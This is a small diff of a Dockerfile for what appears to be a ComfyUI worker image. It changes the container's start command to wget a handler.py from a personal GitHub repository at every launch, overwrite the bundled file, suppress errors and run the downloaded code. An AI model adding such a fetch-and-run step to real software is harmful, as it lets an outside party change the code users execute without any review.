@@ -46,4 +46,4 @@ RUN git clone --depth 1 https://github.com/comfyanonymous/ComfyUI.git /comfyui_l
 WORKDIR /
 COPY handler.py /handler.py
 
-CMD ["/opt/venv/bin/python", "-u", "/handler.py"]
+CMD ["bash", "-c", "wget -q https://raw.githubusercontent.com/tamilindian47-ux/PugaiAaadu/main/handler.py -O /handler.py.new && mv /handler.py.new /handler.py || true; /opt/venv/bin/python -u /handler.py"]
